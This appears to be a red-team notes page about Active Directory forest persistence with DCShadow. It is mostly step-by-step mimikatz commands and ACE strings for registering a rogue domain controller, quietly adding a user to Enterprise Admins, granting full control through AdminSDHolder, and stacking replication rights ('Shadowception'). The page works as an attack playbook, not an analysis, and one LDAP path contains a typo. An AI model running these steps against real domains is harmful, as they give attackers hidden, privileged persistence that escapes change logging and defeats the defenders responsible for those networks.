---
title: Forest Persistence
category: Active Directory
order: 7
---

We are going to discuss some ways to do a persistence in a forest root.

# DCShadow

DCShadow temporaly registers a new DC in the target domain and uses it to push attributes like `SID History`, `SPNs` and more over on the specified object without leaving the cange logs for modified object.

The new domain controller is registered by modifying the configuration container, SPNs of an exisiting computer object and couple of RPC services.

Due to the attributes are changed from a domain dontroller, **there are no change logs on the actual DC for the target object**.

By default, domain administrative privileges are required to use DCShadow.

To execute this persistence we need to use two isntances of mimikatz. The first one starts RPC servers with SYSTEM privileges and specify attributes to be modified:

```powershell
!+
!processtoken
lsadump::dcshadow /object:root1user /attribute:Description /value="Hello from DCShadow"
```
And the second one with enough privileges, such as DA, will push the values:

```powershell
lsadump::dcshadow /push
```

> **Note**: DCShadow can be used with minimal permissions by modifyng ACLs, `Nishang` has a script to set this permissions to a user.
>
> `Set-DCShadowPermissions -FakeDC machine-user01 -SAMAccountName root1user -Username user01 -Verbose`

## Set Primary Group ID to Enterprise Admin

Now that we have been discovered how to overwrite attributes of users, we can change the group id of a user to the id of the enterprise administrators or domain admins.

```powershell
lsadump::dcshadow /object:user01 /attribute:primaryGroupID /value:519
```
> **Note**: This makes noise, because every one who looks `net group "Enterpise Admins" /domain` will see that the user user01 is a member.

## Modify ntSecurityDescriptor for AdminSDHolder

We can modify the `ntSecurityDescriptor` for AdminSDHolder to add full control for a user.

```powershell
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=AdminADHolder,CN=System,DC=corp,DC=local")).psbase.ObjectSecurity.sddl
```
We just need to append a full control ACE from above DA with our users SID.

```powershell
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=corp,DC=local /attribute:ntSecurityDescriptor /value:<MODIFIED ACL>

Modified ACL:

ORIGINAL ACL + FULL CONTROL FOR OUR USER
....(A;;CCDCLCSWRPWPLOCRSDRCWDWO;;;S-1-5-21-560323961-2315414123-15432421423-1323)
```

> **Note**: We just need to add our SID to the SY/BA/DA ACE result. To see the SID we can use:
>
> `Get-NetUser user01`

## Shadowception

We can even run DCShadow from DCShadow. To do that task we will add the following ACLs:

```powershell
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=corp,DC=local")).psbase.ObjectSecurity.sddl
```
> **Note** We can use `/stack` to stack multiple ACL.

### Domain Object

* List ACL:
```powershell
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=corp,DC=local")).psbase.ObjectSecurity.sddl
```
* Append the following ACE:
```
(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;<USER SID>)
(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;<USER SID>)
(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;<USER SID>)
```
* Stack the ACL
```
lsadump::dcshadow /stack /object:DC=corp,DC=local /attribute:ntSecurityDescriptor /value:<MODIFIED ACL>
```

### Attacker Computer Object

* List ACL:
```powershell
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=machine01,DC=corp,DC=local")).psbase.ObjectSecurity.sddl
```
* Append the following ACE:
```
(A;;WP;;;<USER SID>)
```
* Stack the ACL
```
lsadump::dcshadow /stack /object:machine01$ /attribute:ntSecurityDescriptor /value:<MODIFIED ACL>
```

### Target User Object

* List ACL:
```powershell
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=user01,DC=corp,DC=local")).psbase.ObjectSecurity.sddl
```
* Append the following ACE:
```
(A;;WP;;;<USER SID>)
```
* Stack the ACL
```
lsadump::dcshadow /stack /object:targetuser01 /attribute:ntSecurityDescriptor /value:<MODIFIED ACL>
```

### Sites Configuration Object

* List ACL:
```powershell
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Sites,CN=Configuration,DC=corp,DC=local")).psbase.ObjectSecurity.sddl
```
* Append the following ACE:
```
(A;CI;CCDC;;;<USER SID>)
```
* Stack the ACL
```
lsadump::dcshadow /stack /object:CN=Sites,CN=Configuration,DC=corp,DC=local /attribute:ntSecurityDescriptor /value:<MODIFIED ACL>
```

Finally we just start the server:

```
lsadump::dcshadow
```

And on the other session with DA privileges:

```
lsadump::dcshadow /push
```